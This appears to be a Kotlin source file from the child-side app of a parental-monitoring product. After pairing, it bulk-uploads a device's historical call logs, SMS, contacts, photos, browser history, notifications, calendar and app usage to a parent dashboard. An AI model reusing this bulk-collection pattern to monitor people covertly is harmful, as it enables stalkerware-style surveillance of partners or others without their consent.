package com.example.kidsguardchild.core

import android.content.Context
import android.util.Log
import com.example.kidsguardchild.modules.*
import kotlinx.coroutines.*

private const val TAG = "InitialSync"
private const val PREFS = "kidsguard_prefs"
private const val KEY_DONE = "initial_sync_done"

/**
 * One-time bulk upload of existing on-device data after pairing.
 */
object InitialSyncManager {

    fun runIfNeeded(context: Context, scope: CoroutineScope) {
        val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        if (prefs.getBoolean(KEY_DONE, false)) return
        if (!PermissionHelper.isPaired(context)) return

        scope.launch {
            Log.i(TAG, "Starting historical data sync to parent dashboard…")
            try {
                if (PermissionHelper.hasCallLog(context)) {
                    CallLogModule(context).syncHistorical()
                }
                if (PermissionHelper.hasSms(context)) {
                    SmsModule(context).syncHistorical()
                }
                if (PermissionHelper.hasContacts(context)) {
                    ContactsModule(context).uploadContactsOnce()
                }
                if (PermissionHelper.hasMediaRead(context)) {
                    PhotosModule(context).syncGalleryBulk(60)
                }
                if (PermissionHelper.hasWifi(context)) {
                    WifiModule(context).logCurrentNetworks()
                }
                BrowserHistoryModule(context).syncHistorical()
                if (PermissionHelper.hasCalendar(context)) {
                    CalendarModule(context).syncOnce()
                }
                if (PermissionHelper.hasNotificationListener(context)) {
                    NotificationSyncBridge.requestHistoricalSync()
                    delay(3000)
                }
                if (PermissionHelper.hasUsageStats(context)) {
                    UsageStatsModule(context).syncHistorical()
                }
                prefs.edit().putBoolean(KEY_DONE, true).apply()
                Log.i(TAG, "Historical sync completed")
            } catch (e: Exception) {
                Log.e(TAG, "Historical sync error: ${e.message}")
            }
        }
    }

    fun reset(context: Context) {
        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putBoolean(KEY_DONE, false).apply()
    }
}
